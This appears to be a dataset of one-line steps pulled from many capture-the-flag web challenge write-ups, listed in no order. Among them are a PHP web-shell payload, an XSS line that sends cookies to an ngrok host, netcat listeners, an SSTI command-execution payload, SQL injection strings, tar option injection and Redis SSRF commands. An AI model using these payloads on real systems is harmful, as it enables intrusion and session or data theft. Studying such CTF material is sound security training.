    "Inspect the functionality of the website, noting that it includes the ability to upload photos and the showcasing of uploaded photos",
    "Find a PHP payload that will provide a web shell and set the theme to it '/set.php?theme=<?php system($_GET['c']) ?>'.",
    "Used a recent exploit to bypass 'disable_functions' on PHP 7.0-8.0 versions and gain shell remote code execution",
    "Inspect the front-end source code: Frontend source is heavily obfuscated, but focus on the element and class names to recognize different components",
    "Entered ?source=1 as an HTTP parameter to retrieve the PHP source code",
    "Initialize a GET request to the target URL.",
    "Changed 'X-Forwarded-For' header in a Burp Suite Intruder scan to the internal IP address identified from the gallery.php.",
    "Identified several functionalities accessed by authenticated users by spotting '@login_required' annotations",
    "Flag was 'darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}'",
    "Understood from the code snippet that the md5 hash must collide. This means two different strings should give the same md5 hash",
    "Accessed the provided URL to check the PHP source code",
    "Tried to decode the data contents unsuccessfully.",
    "Look at the responses when searching for a note and examine the issued redirects",
    "The leaked secret key was then used to fake a session with 'is_admin' privileges, which allowed for reading the flag",
    "Noted that most common PHP file extensions are blocked except .htaccess",
    "Examine GitHub repo linked in the challenge that belongs to a user named Magpie Inc",
    "Place this newly crafted cookie back into the application using Burpsuite and observe that you now get the flag in the response.",
    "Discover an HTML comment hinting at two more pages: upload.php and photos.php",
    "Noticed that comments need to be approved as indicated by the change in the URL after submitting a comment",
    "Identified that the '/usr/games/cowsay' game is operated from 'child_process.spawnSync'",
    "Set the Host as 'dscvit.com'",
    "Defined 'os.ProcAttr' and assigned file descriptors for standard input, output and error handling;",
    "The encoded string contained the ASCII representation of the flag",
    "Notice a 'session_id' stored in a cookie, which is an MD5 hash that can be cracked",
    "Discover the user can add notes via a POST request to /add.",
    "Bypassed filter and performed an internal port scan for ports between 5000 and 10000.",
    "Inferred from the challenge that grades are uploaded through a json file",
    "Reconsidered the source code and realized that the user authentication process could be vulnerable to a SQL injection.",
    "Devise a strategy that involves acquiring the secret key from the store object, to sign a 'jwt' with a controlled object to purchase a 'flag' for $1.",
    "Noted the situation that even though the app was hidden behind Nginx reverse proxy, 'req.ip' always pointed to the same IP address of the reverse proxy",
    "Identify web application that allows file uploads and conversions",
    "Write a Python script to automate the extraction of hidden fields from the website's HTML",
    "Noticed that clicking on 'Facebook', 'Google' or 'Twitter' buttons attaches the note id and password to the shared URL.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Identified a line of code where user input is passed unfiltered directly to SQL query",
    "Leveraged the assumption that a POST request might be needed and that the word 'launch' could be a keyword",
    "Investigate the site and its rules",
    "Analyzed the resulting PNG file from the uploaded and converted gif and found the flag written on it.",
    "Get the final page after 1500 iterations through command session.get('https://shiba.yactf.ru/')",
    "Checked the source code of the homepage",
    "Passed a random value which revealed that a 'vim' command must be used.",
    "Prepare to alter the JWT 'username' to the rot13-encoded version of a listed admin username.",
    "Run SQLMap command 'sqlmap http://127.0.0.1/test.php?search=abc -p search --tamper=space2comment --technique=B --risk 3 --dump --threads 10 -D db -T internal_api_infos' to inject and dump database data.",
    "Send a request to obtain a list of users and identify the new user's id.",
    "The output was injected into the exploit page\u2019s `style` element, which was readable by the attacker",
    "Ran `echo shell_exec(\"../flag\");` on the website.",
    "Researched and identified that a prototype pollution vulnerability exists in `applyPatch()`",
    "Decided to exploit 'unserialize' method to craft an object with desired parameters.",
    "Find out that the 'SCRIPT_NAME' WSGI variable can strip its prefix from 'PATH_INFO'",
    "Identifying 'scriptlet' as being vulnerable to Shellshock",
    "Modified the payload script by incorporating the PHP 'disable_functions' bypass exploit, and ran '/readflag' by passing it as an argument to the defined 'pwn' function",
    "Used this script on the prepared website: `<script src='https://cookiemonster.2019.chall.actf.co/cookies'></script>`",
    "Analysed the websockets traffic by observing the post retrieval packets",
    "Reviewed online documentation to understand how MySQL executes query portions inside comments",
    "Identified the challenge to be located at port 8080 with a web interface",
    "Observe the name and text of the challenge which refers to 'robots'",
    "Used an XSS payload using 'innerHTML' to fetch the flag",
    "Tried the second exploit which also seemed to be ineffective",
    "Identify a second javascript file that sends the XML envelope and reads the answer",
    "Intercept the HTTP request to understand the form submission structure",
    "Send the crafted POST request to the server",
    "Visited the website",
    "Constructed a payload which utilises 'x:script' to exploit the vulnerability",
    "Modify the SQL injection query to check if the password is the flag",
    "Requested an OTP at '/request_code' to set 'user.code' to a random 4-digit number",
    "Decide to add the base64-encoded serialized object as a 'login' cookie in the browser, and navigate to /authentication.php, as that's where the needed 'access_log' class is defined",
    "Created a payload using functions that when run, return 1337",
    "Recognize the security checks in place, the most crucial one is in the 'checkout(req, res)' function that will verify the token's signature matches the key.",
    "Identified two distinct changes to the 'index.php' file in two separate revisions.",
    "Used the XSS vulnerability to send a POST request to '/reset2fa' aiming to reset the admin's 2FA code",
    "Set up a PHP script on '/pleb.my.ip.nip.io' that returned the X-Accel-Redirect header, revealing the '/admin' directory's contents.",
    "Decode the JWT, e.g., at jwt.io, revealing a payload with 'username', 'password', and 'admin' keys.",
    "Injected the base64 version of the bash script to enumerate the folder content",
    "Accessed '/debug/answer' endpoint which was restricted both by nginx and the application.",
    "Analyzed the converted code 'window['localstorage']['setItem']('flag', atob('SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9'))'",
    "Analyze the code to understand its behavior and identify potential vulnerabilities.",
    "Entered a common password, for example, 'password', bypassing the JavaScript check",
    "Used the PHP /// uri with their base64 encoding filter to allow for file reading.",
    "Ran a final SQL query to retrieve the flag from the 'flag' column in the 'flag' table",
    "Reload the website page with the new user-agent and find a message containing a 'secret key' for the cookies",
    "Identify that the payload checks for the 6th character of the flag in the SQL database. If it matches 5, it sets the LIMIT to 1, otherwise it sets the LIMIT to 2",
    "Uploaded a file into the FTP server using the profile picture upload feature",
    "Discovered that 'ups_status' and 'restart_ups' commands return the output from a local web server using curl. Checked the output of the 'List Processes' command and found 'python3 /root/ups_manager.py'. Reviewed the source code for 'config/ups_manager.py'. This file runs an HTTP server with the two endpoints accessed by the 'ups_status' and 'restart_ups' commands - it also has a '/get_flag' endpoint that prints the flag.",
    "Used the SQL injection to enumerate the columns of the flag table",
    "Managed to by-pass the 'strpos(urldecode($remote),'..')' and 'parse_url($remote, PHP_URL_HOST)' conditions",
    "Identify the 'secret key' for the site's cookies: flour_sugar_chocolate_and_lotsalove",
    "The URL leads to a file containing the flag",
    "Observed a post message which mentions an FBI DB dump at https://tinyurl.com/fbi-hack and contains a tripcode",
    "Use the caught cookies to send request to `https://xmas.2020.chall.actf.co/admin`",
    "Analyzed the provided PHP source code to identify vulnerabilities",
    "Setting up a netcat listener on a local server to capture incoming connections",
    "Downloaded the code for the app and examined the contents",
    "Encode the malicious serialized class in base64",
    "Submitted the admin's cookie to get the flag: **actf{defund_is_the_real_cookie_monster}**",
    "Identify a potential PHP deserialization vulnerability in cookie.php, where $_COOKIE['login'] is deserialized",
    "Successfully added 1337 coins to the account",
    "Identified two files 'login.php' and 'login.php.bak' listed",
    "Apply rot13 decoding on the 'admin' value, which returns 'false'.",
    "Executed the curl command 'curl 'http://universe.chal.ctf.westerns.tokyo/a' -H 'Host: terjanq.me' to bypass restrictions",
    "Ran a series of SQL queries via URL manipulation testing each column value",
    "Obtained a sequence of hexadecimal values, which seemed to be MD5 hashes",
    "Set up a listener and found that the '/pleb' proxy wasn't forwarding non-ASCII characters.",
    "Realized that the method failed due to the JavaScript trying to parse parentheses",
    "Notice the requests being made to the API endpoint carrying a 'username' attribute",
    "From another 'null' origin, send an XSS to the pop-up and steal the identifier",
    "Identifying that 'flag.file' contains a hexadecimal representation of a GZip archive",
    "Acquired the flag YauzaCTF{PHP_minecraft_h4ck3r} by executing the command",
    "Discover the missing git objects by trying to checkout the master branch",
    "Successfully accessed all accounts with the credentials",
    "Noted that the relative paths would now load scripts from the attacker's server, which would usually not be possible due to the CSP.",
    "Used the new SQL injection, got authenticated as 'flagman69' and received the flag.",
    "Modified the PHPSESSIONID cookie in the browser to Maria's session ID to impersonate her.",
    "Investigated users.php page for additional SQL injection endpoints.",
    "Any HTTP error during the page request is printed",
    "Created a callback that reflected the response into Javascript code in order to inject arbitrary Javascript to exfiltrate contents from admin's page",
    "Check cookies",
    "Bruteforced password at :7777 to determine the leaked byte",
    "Determine that 'key2' is a shuffled version of 'key'. This shuffle is based on seeded random values tied to the 'User-Agent'.",
    "See that this leads to eval function executing file_get_contents('../flag.txt')",
    "Request Chromium to open a new webpage, targeting the URL file:///tmp/flag.txt with the port number obtained causing the flag to be displayed in the browser instance",
    "Sent a POST request to the server with a payload that used the SQL LIKE clause",
    "Consider the downside of the above PoC - the potential strain on the server due to very long URLs",
    "Identified that it's possible to embed any code into html with the GET parameter",
    "Identified need to bypass server checks to access flag",
    "Corrected a mistake in the test where the payload was executed before serialization instead of after",
    "This action made the command run within a shell, allowing command injection to be performed",
    "Discovered a file named 'flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Smuggle a request to the backend application, bypassing the access control implemented on ATS",
    "Try to inject an attribute into the 'img' element of the response by utilizing the 'cat' parameter in a request to '/ajax/articles?cat=asdf\"x=\"'",
    "Inspect the back-end source code: Back-end source is given in the problem statement. Analyzing the source reveals that positions are sent to the client in a JSON array. The first position sent is the winning position",
    "Realize that despite this raised exception, point history is successfully modified with each request to buy an item.",
    "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'",
    "Realized that replacing 'card_num' with 'R34L_F14G' in the SQLMAP query fails the blacklist filter.",
    "Used <meta name='referrer' content='no-referrer'> to bypass the restriction caused by the referrer header.",
    "Suspected it had something to due with security protections such as a WAF after noting the title 'advertisement' and the presence of protected DIG records",
    "Use the dumped admin credentials to login to the first webpage.",
    "Logged in as admin using the discovered SQL injection",
    "Realize that the secret key needs to be cracked. To do this, write a script that bruteforces each of the hardcoded cookie names to find the one that matches the signature.",
    "Authenticated as admin and explored login.php",
    "Create a separate account to then buy the flag sold with negative price",
    "Created a CSRF request using Fetch API on 'mobile-viewer' page to get SSH key to our attacker site.",
    "Decide to provide code JSON, which 'JSON.parse()' will then parse",
    "Identified the need to overwrite the <userID>_isAdmin value and the possibility to leverage the SSRF vulnerability to communicate with the Redis instance",
    "Analyzed the provided files (app.py and store.py), confirming no intentional vulnerabilities within.",
    "Recognized that file path in 'export_db' function could be manipulated for path traversal.",
    "Take note of the returned JavaScript code",
    "Identified that 'Cheap' can be bought by entering a valid credit card but purchase failed for 'flag'.",
    "Discovered that by using 'test' or 1-- - possible account credentials can be obtained but they don't provide the flag",
    "Start a loop to generate and send multiple POST requests to upload multiple files of random content until the total size exceeds 10 records.",
    "Receive the output displaying the flag",
    "Write an exploit script that creates an object with properties : 'username', 'password', '_correctValue' and 'mfa'. 'username' and 'password' are provided. '_correctValue' is set to NULL and 'mfa' is assigned the address of '_correctValue'. This ensures that 'mfa' and '_correctValue' are always identical.",
    "Find a reference to another page, authentication.php, in the index.php code",
    "Took a closer look at `poll.dart` which had a Mechanism `ApiMapper` that makes a GET request to the specified `apiGet` URL.",
    "Identifies an inaccessible server that is hosting data-server.",
    "Noticed that each challenge string must be found every time it is called, which can be optimized.",
    "Found the first part of the flag 'accessdenied{1_w3nt_thr0ug' in an HTML comment",
    "Read the challenge description and requirements, the vulnerability lies in Express query parsing",
    "Bypassed the Angular application that was set up behind Nginx reverse proxy.",
    "Attempt to send 'POST' data to the 'profile.php' or 'manage.php' with a 'Referrer' different from 'web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one' resulted in 'Wrong Referrer' error",
    "Found that in 'app.py', the flag is exposed",
    "Assuming the posting date as the current date, write a PHP script that brute force all possible remaining octets of the IP address within the range of 0 to 256",
    "Made a GET request to http://ctfchallenges.ritsec.club:3000/auth specifying the name as m3ssap0 and received a JWT(token).",
    "Refreshed the webpage to retrieve the flag",
    "Use CRLF injection in Lua's HTTP library to bypass the X-Real-IP protection",
    "Discovered two exploits related to the 'Modern events calendar' plugin in the exploit database",
    "In this file two dependencies 'md-to-pdf' and 'nunjucks' were identified as potentially interesting",
    "Identified that the application didn't trust 'X-Forwarded-*' headers so the IP address couldn't be overridden",
    "Used the knowledge of the vulnerability to conclude that the web application potentially parses the HTML content and interpret it, implying a possibility of Cross-site Scripting (XSS)",
    "Sent another curl request, this time, setting the new flag value as the cookie",
    "Understand that the challenge is based around exploiting dynamic renderers like Prerender, used to render sensitive endpoints via a custom host header",
    "Used the signing certificate to generate a new HMAC signature and appended it to the header and payload.",
    "Notice that the application is a 'screenshotter' service that allows users to enter arbitrary URLs to be rendered by a Chromium instance",
    "Further exploited the SSTI vulnerability by crafting a URL that would read the contents of a 'flag.txt' file on the server using built-in Python functions within the Jinja2 template.",
    "Given a simple Web server written in Python, handling only GET and POST requests with files",
    "Ran a final UNION query against the identified table for flag extraction",
    "Identify the app is a Node.js TypeScript app written with Next JS",
    "This then allows the flag to be brute-forced by guessing all possible characters in each position of the flag, each character having a background URL corresponding to the guessed flag.",
    "Viewed the page with the flag, 'rtcp{rtcp-*is-s/ort-of-se1fh0st3d}'.",
    "Started a new process to execute '/bin/sh' with argument to read flag file and redirect the output to '/tmp/jizz';",
    "Enter the website and encounter a login page. Type a random base username and password for the login",
    "To adhere to Same Origin Policy, open a new window from the exploit server with the URL 'http://10.8.201.87:5000/checkbalance?amount=${num}'.",
    "Identify hashes through brute forcing that start with the '0e' prefix and thus match the target",
    "Added GET parameter to final URL, calling a specific function",
    "Inferred from the knowledge of SQL Injection that the username and password input can be manipulated.",
    "Hosted a file at `/static/page.js` on the attacker server and enabled CORS to execute arbitrary JavaScript through this file.",
    "Identified the first exploit as unusable as it required authentication",
    "Logged in with new user_id and password",
    "Use trial and error to narrow down the appropriate number by controlling the number of intervals in the aforementioned steps.",
    "Inferred that additional log files should be found based on hints in the challenge description",
    "Received the contents of the 'flag' file in the HTTP response, which contained the flag: `AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O}`",
    "Included a manipulated cookie in the request's header to bypass any session-based authentication",
    "Recognize the XSS prevention methods implemented by the site - cookies are set to prevent XSS for all API endpoints.",
    "Analyzed the HTML to find possible vulnerabilities. A CSRF token was observed that may indicate a potential CSRF vulnerability.",
    "Sixth step: Identified an exploit: if a 302 redirect is detected this indicates that the flag leaks due to the network error from exceeding the Fetch API redirect limit.",
    "Applied a payload that reveals some useful information about the server environment and file structure",
    "Created a function named 'api' which reads the file 'satellite.txt';",
    "Decided to forge the cookies with obtained information: the fake flag and the admin's PHP Session ID",
    "Accessed the flag.txt file and found the challenge flag.",
    "Executed SQL statement: SELECT username, password FROM users WHERE username='adm' || trim('in',' AND password=') || ''",
    "Ran the Python script to generate a URL-encoded string that can be placed in the URL parameter 'demo', which will execute our malicious JavaScript code when the page loads.",
    "Deployed the provided Docker image and examined the `readflag` binary",
    "Identify 3 key sections: User Registration, User Login, and Admin Login",
    "After unsuccessful attempts searching for YouTube's JSONP endpoints, found an issue on Google's issue tracker regarding YouTube's 'oembed' API not implementing JSONP",
    "Locate the JWT token within the session cookie, decode it and extract the 'id' of the user (attacker)",
    "Starting a 'netcat' listener on your server at the specified port.",
    "Replaced a specific string in the cleaned PDF data to ensure compatibility with different versions of 'mutool'.",
    "Confirmed the challenge 'Gif2png' requires interaction with a Flask application.",
    "Identified that input sanitization is only implemented on the front end via JavaScript.",
    "Note how ATS processes the LF as the end-of-line, leading to the second request be encapsulated in the chunked content of the first request",
    "Wait for the admin cookies to be caught by a server listening with `nc`",
    "Identify the required (subprocess.Popen) class for the exploitation at position 407",
    "Displayed this data in html to get the flag",
    "Deploy this page on a server and point the 'screenshotter' service to it, allowing you to detect open debugging ports",
    "Implemented a trick to bypass `innerText` resetting the prepared CONFIG clobbering in the payload.",
    "Checked source code and identified the prototype pollution vulnerability",
    "Ran brute.py script to output arbitrary SQL queries",
    "Opened the webpage",
    "Cloned the GitHub repository using a private SSH key retrieved from the database",
    "Discover the website uses JWT tokens to count the number of 'boops'",
    "Created the GET request: 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1 Host: 138.68.228.12 Connection: close'",
    "Obtained an authenticated session cookie for 'admin' in return",
    "Explored the site using ZAP Proxy",
    "Discovered that the chat functionality was vulnerable to HTML tag injection - messages were not being escaped",
    "First, an SQLite injection is identified that can be made in the form of create table statement, with limit of 32 characters.",
    "Reviewed online documentation to understand how MySQL executes query portions inside comments",
    "Test the system's reaction to an invalid productId value",
    "Tried the payload '; ls #'",
    "Located 2 'users.db' files, both are sqlite3 databases.",
    "Analyzed the Docker file.",
    "Understand that both Request smuggling vulnerabilities were discovered during previous research on ATS, Puma and Waitress by the challenge provider and other researchers",
    "Briefly analyze the encoding function to get the basic idea for decoding messages.",
    "Attempted to connect to the real server",
    "Input the crafted payload '1 OR 1=1--' into the vulnerable function",
    "Composed a malicious HTTP GET request to exploit the vulnerability",
    "Bypassed authentication by using the payload 'username=test&password=test' or 1=1 LIMIT 1;#'.",
    "Analyzed a simple PHP script using YAML",
    "Used a POST request to request 'file:///code/app.py' and review the server code",
    "Created exploit using SQL injection: 'adm' || trim('in', ` Password: `) || ''",
    "Analyzed the JavaScript source provided in the challenge.",
    "The flag is displayed on the screen, copy it",
    "Submitted an SQL injection in the 'email' and 'pass' parameters using a payload conforming to the INSERT query syntax.",
    "Examined the website's '.git' folder",
    "Make several attempts to exploit the path traversal vulnerability, inputting 'Accept-Language: ....//....//....//....//flag' in the HTTP header",
    "Use /apisix/batch-requests to SSRF to localhost only admin endpoint with the hardcoded key",
    "Created a payload that loads /demo in an iframe, posts a message to trigger the /api/filter POST request in the admin's context, then catches and sends the response, containing the admin's hash, to an exploit server",
    "Given an endpoint that allows sending feedback in form of HTML. Initial attempts to supply URLs were futile.",
    "Authorize using the admin:admin credentials",
    "Suspected it could be related to Cloudflare protections after examining DIG records",
    "View page source and found a commented information indicating possible internal IP and an endpoint for admins.",
    "Determine that template injection is possible when passing things in the textbox",
    "Download the source code attached to the CTF challenge.",
    "Created a proper payload that reads the flag file via the file system and returns the flag as the username - to be displayed on the welcome page",
    "Submitted the registration form with 'account[role] = admin' to change the role and escalate privileges",
    "If the challenge is 'Gate keeper', specific values are assigned to the same variables, like url and check",
    "Identified the URL of the flag containing post '/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b' from the exfiltrated contents, and repeated the Javascript injection to fetch the flag",
    "Realized that http://flagportal.chall.seetf.sg:10001/api//flag-plz would be mapped to http://backend/flag-plz.",
    "Realized the application was simulating a Brainf*ck decompiler, which had protection against `<` and `>` characters with a `replaceAll` function.",
    "Adjusted the value of the secure cookie 'admin' to the desired comparison value 'true' to create a signed cookie in the browser.",
    "Observe that server responds with a message including the author of the feedback.",
    "Identified a post made by admin with the flag which is only visible to the admin",
    "Visited URL: https://web0.ctfsecurinets.com/ and tried to access common pages like foo.php",
    "Used the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py",
    "Both 'profile.php' and 'manage.php' are protected by a 'hidden token', these tokens are associated with the current session",
    "Received the flag as the response",
    "Visited the link provided in the challenge",
    "Print the final page content and session cookies",
    "Used the 'flag' value on the '/com/seaerch/' endpoint which provided another part of the flag.",
    "Capture admin's cookie: `admin_GgxUa7MQ7UVo5JHFGLbqzuQfFFy4EDQNwZWAWJXS5_o=`",
    "The first step in solving this challenge was to analyse the verify() function.",
    "Start the checker for a number range.",
    "The flag 'CTFSG{d0nT_toUcH_mY_c00k13s}' is obtained",
    "Additionally found in js.main the last piece of our flag:1nsp3ction_",
    "Decided to use the `jsonp` method itself to perform cross-origin request",
    "Continue the investigation by exploring the scope of the Template Injection vulnerability despite the past reported vulnerability being fixed.",
    "Upon redirection, found a webpage that contained three files.",
    "Checked the site's 'Bug Bounty' form which sends suspicious URLs to be visited by a headless Chrome agent.",
    "Downloaded and decompiled the found binary.",
    "Create a crafted payload utilizing XXE to attempt reading a file from the server",
    "Discovered the smarty-4.0.1 PHP library and the templates_c folder through investigation",
    "Read HTML and found a comment containing PHP code to upload a file. This code also renames an uploaded file with a random name while preserving the file extension",
    "Replace the original cookie with the new base64 encoded 'chocolate' cookie on the website",
    "Realize that this JS file calculates some sort of document's hash and then compares it with the original",
    "Created a symlink on the NFS filesystem using the SSRF exploit",
    "Identified a misconfiguration in the `apache.conf` file",
    "Because of the weak encryption, infer that it should be related to brute-forcing for secret_key",
    "Review the given source code, which is a Javascript calculator web app.",
    "The first step started by examining the cookies in the HTTP request and identifying a key called 'likeCookie' whose value was set to false.",
    "Checked the MD5 hashes of both the PDFs using the hashlib library to confirm they are the same.",
    "Crafted the malicious query '/gallery?galleryUrl=http://localhost:20011/admin' to access the admin console via internal request",
    "Leveraged the '<base>' HTML tag to set the base URL for all relative URLs in the document, helping bypass the Content Security Policy.",
    "Discovered the flag in the password of a note",
    "Notice that a vulnerable version of the Python Pillow library is being used and find a related pull request on github to gain insights.",
    "Test basic payloads and identify SQL injection is possible but spaces aren't allowed.",
    "Injected a further cookie named 'made-an-account' with value 'true'",
    "Decoded the password hash to find password 'csictf'",
    "Inspected Create Post code and identified the BeautifulSoup module being used to sanitize HTML and a restrictive CSP",
    "Found a working payload with username `admin' -- ` and any password, which revealed the unapproved toy containing the flag: `HTB{1nj3cti0n_1s_in3v1t4bl3}`.",
    "Figured out how to use '--eval' option to run inline JavaScript",
    "Read the flag from the alert.",
    "Payload is structured in JSON and added to the URL after first  '?' character.",
    "Identifying two significant functions: The first function sets specific server response headers if the request comes from '127.0.0.1', and the second function is used to proxy images.",
    "Performed a string search on the 'out.bin' file and found a potential flag.",
    "Realized that 'jsonwebtoken' 3.2.2 had a known authentication bypass vulnerability",
    "Used CrackStation to identify the passwords for the hashed passwords, resulting in credentials `manager:bigsanta!` and `admin:tryharder`.",
    "Used 'bzr revert' to recreate the 'index.php' file, which contained the flag.",
    "Identify the constraints: the payload must be less than 30 characters and cannot contain 'zer0pts'.",
    "Further scrutiny of the code revealed that when a note is saved and self.set() is called, the note's contents are added to the 'data-last' attribute of the '#note-text-area' element. The DOMPurify v2.3.0 tool is used for sanitizing the note, with 'link' and 'style' tags explicitly permitted.",
    "Find the mechanism through which the 'id' in the token is created (concatenating 'store_name' and 'item_name') and how the token is signed using 'store.key'.",
    "Assumed that one of these notes contains the CTF flag",
    "Wrote a payload using this Template Literal method to directly call the directory function with 'flag' as its parameter",
    "A request to /admin was constructed and resulted in catching the request including the Admin-Key on our own server.",
    "Found out that length of the flag is 38 characters",
    "Exploited the vulnerability using ninjucks SSTI to read the flag from the '/flag' file by adding the payload '{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /flag*')\")()}}'",
    "Realize that although XSS can be performed, it would only affect the currently logged in user and not the admin.",
    "Identified the target 'config.php' file and inferred it must be printed via curl execution.",
    "Use this behaviour when constructing SQL queries to bypass the login",
    "Investigated potential for NoSQL injection due to use of MongoDB",
    "Visited the URL with the payload '?icecream={{globals()}}', discovering the variable name 'application' linked to the tornado.web.Application object.",
    "Successfully logged in as admin and found the flag.",
    "Created another Perl code snippet to read the contents of the file named 'flag'. The snippet (`EOC\n$eyes=`cat flag`;print '$eyes';`) was injected through another HTTP POST request to /cow_designer.",
    "Set the Referer as 'google.com'",
    "Add custom JavaScript code to the 'code' key in order to leak the cookie, and provide an empty array for 'variables'",
    "Made a POST request to the server with a calculation statement",
    "Discovered that 'website' runs 'yarn dev', which in turn runs 'vitepress dev src', and that Vitepress is in dev mode.",
    "Understand the provided code, which validates a given IP by first checking if it is a private IP using the ipaddress library. If the IP is not private (i.e., it's a global IP), the code proceeds to send a GET request to the provided url.",
    "For each iteration, create a file of 1024 bytes with a random name ending in '.txt', send a POST request to upload this file, then create a tar archive with these files and verify the current size of the tar archive.",
    "Tested single characters, ranging from '0' to 'f', as the value for both 'pass' and the User-Agent header",
    "Relocated flag name from 'flag.txt' to 'signal_sleuth_firmware' in root",
    "Noticed a JS file 'jquery.jscroll2.js' in sources",
    "Sent a request to the API endpoint with the appropriate 'X-Cat-Header' and obtained AWS credentials",
    "Set the `login` cookie to the output of the previous step.",
    "Submitting the generated token to retrieve the flag.",
    "Identified the list of references to the PDF pages in the merged PDF file.",
    "Connected to 'last-revision' in the 'branch' folder within '.bzr', revealing the last revision.",
    "Break down the payload: First part constructs a string representation; second part is used to perform 'file_get_contents('flag.php'); final part is used to perform variable dump (var_dump($_0)).",
    "Injected the crafted payload into a request in either the top text or bottom text",
    "Database credentials are found in the output ('dogooo' for 'db_user' and 'dogZgoneWild' for 'db_pass')",
    "Noted the output shown upon submitting an article, including a reference to a potentially fake flag and the session info",
    "Logged in as admin",
    "Executed HTTP POST request to the target server with the final payload as part of form data and received the flag as part of HTML response, confirmed successful RCE exploited to get the flag",
    "Identify the 'eval()' vulnerability and understand the list of blocked keywords/functions in the source PHP code",
    "Craft an XSS payload that utilizes the specified attributes to redirect and assign the document's cookie to the query parameter of a specified URL",
    "'request.args.get('amount')' was added to the user balance",
    "Found out the parameter 'uuid' in the request 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=<uuid>' is vulnerable to injections ( XSS/CSS ) and is limited to '36 characters'",
    "Gained access to '/admin' after the role was successfully changed to 'admin'",
    "Visited the given URL http://35.207.91.38/robots.txt and found a disallowed directory: /backup/.DS_Store",
    "Identify that CSRF token is not being checked and WebSockets are not restricted by the Same-Origin Policy, hence enabling 'cross-site WebSocket hijacking' to obtain and exfiltrate the flag",
    "Made an account on the website to get the JWT Token and public key by copying the 'session' cookie in the browser's developer tools.",
    "Refresh the page to obtain the flag",
    "Decrypted the MD5 hashes to reveal a string",
    "Received a link to a running instance of the challenged web project from picoCTF after starting the instance.",
    "Notice that a normal interaction involves passing a productId value, which the server reflects in the response",
    "Perform a directory scan to reveal available endpoints.",
    "Realization that urllib.parse.urljoin doesn't handle malformed paths correctly - it can return the appended path as the base URL",
    "Considered triggering a custom Cloudflare error, but didn't know how to do it",
    "Infer that IP address has prefix 219 as suggested by the hint and tripcode is 'ueyUrcwA'",
    "Validate that only one result is returned, indicating only one note contains the flag",
    "Confirmed text 'infernoCTF{F33l_Th3_Sh0ck}' in the accessed file as the final flag of the challenge.",
    "Visited the webpage which had an authentication form",
    "The userdata parameter was created by base64 encoding of this solution string.",
    "Decided to write a script to automate this",
    "The challenge involves a proxy server and a backend server accessible at provided URLs",
    "First change contained a Base64 encoded string within a block of HTML code.",
    "Captured the flag from the server's response to the malicious `POST` request.",
    "Restored the repository to the previous commit that contained the flag ('flag.jpg') using 'git checkout' command",
    "Read .env file to get the AUTH_SECRET value",
    "Identified that the second part of the packet is the post ID, and is sent as a URL fragment",
    "Checked the Nginx configuration and noticed that it re-writes and forwards the request to the pre-renderer at `http://renderer:3000` when `User-Agent` header is of the web crawlers.",
    "Translated the bash script into a one-liner to create a malicious 'id' payload",
    "Used the `nonce` to bypass the CSP again in order to exfiltrate data.",
    "Provided with a website with functionalities for login/register, edit profile, and support",
    "Visiting the `/cookies` endpoint to display current cookies",
    "Attempt to send 'POST' data to the 'profile.php' or 'manage.php' with a 'Referrer' different from 'web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one' resulted in 'Wrong Referrer' error",
    "Understood that objects are converted into comma separated attributes",
    "Identify '/cmd.php' endpoint as potentially allowing command injection.",
    "Identified a URL for the server to request, leveraging a Local File Inclusion (LFI) vulnerability for Server Side Request Forgery (SSRF) and viewing files using the 'file://' protocol",
    "Identified that the 'SQL' class has a '$query' attribute which can be modified to perform an SQL injection",
    "Understand that the goal is to fetch all of the password's characters",
    "Discovered the flag within the source code",
    "Use the exploit to read the /etc/flag.txt file and obtain the flag",
    "Accessed the URL `http://yai.sstf.site/paperdetail.php?idx=32%27%20and%20@published=%27no%27%20or%20%27a%27=%27b` to execute the injection attack",
    "Test the observation by creating a URL for a successful and unsuccessful query respectively and compare the resulting origins of the pages",
    "Intercepted the login request with 'Burpsuite' to inspect the response better",
    "Implemented the UNION based SQL Injection using 'username=test' or 1 UNION SELECT *, null from flag-- -&password=test' or 1 UNION SELECT *, null from flag-- -'",
    "Realised that the issue may lie in a type juggling scenario in the comparison: $session_data['hash'] != strtoupper(MD5($cfg_pass))",
    "Attempted to start the app locally with `npm run start` and encountered an error due to permissions",
    "Find out the flag",
    "Repeat the process for characters in each WebSocket packet.",
    "Redirect the user to the main site.",
    "Conceptualize the attack by creating files '--checkpoint-action=exec=sh shell.txt' and '--checkpoint=1'. As '--checkpoint=1' does not pass the file extension check, find alternatives by digging into tar documentation.",
    "Discovered 'manage.php' page with dirbuster, this page is the admin's tool for changing 'user status' to 'premium'",
    "Begin by using the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"a\"}} which returns 'true'",
    "Analyze the provided Python code for vulnerabilities",
    "Replace the initial regex in the Python code with the newly created one",
    "Received a response indicating a healthy status and version",
    "Analyzed the browser cookies",
    "Extracted the flag",
    "After reaching 250 votes, flag message is returned by the server.",
    "Sent the admin to the page with the payload, and the flag was found the profile: 'ctfzone{0190af5705a38115cd6dee6e7d79e317}'",
    "Recognise potential exploit: apply negative price when selling a flag, which increases buyer's balance due to subtraction in 'buyFlag' function",
    "Recognized that 'mobile-viewer' couldn't directly interact with server due to remote address and user agent checks.",
    "Print each response from the server through command r.text",
    "Accessed /private.php using the fetched headers and session ID, leading to the page with the flag.",
    "Created a reverse shell script using only non-alpha chars to bypass message length restriction",
    "Received partial flag after successful bypass of initial server checks",
    "Used inline commands of Redis to send commands directly with the payload 'url=inctf://redis:6379/_SET <userID>_isAdmin \"yes\"'",
    "Discovering a programming error where crypto.randomUUID (the function) is used as the secret, instead of calling it.",
    "Cracked the md5 hashes first due to less required time.",
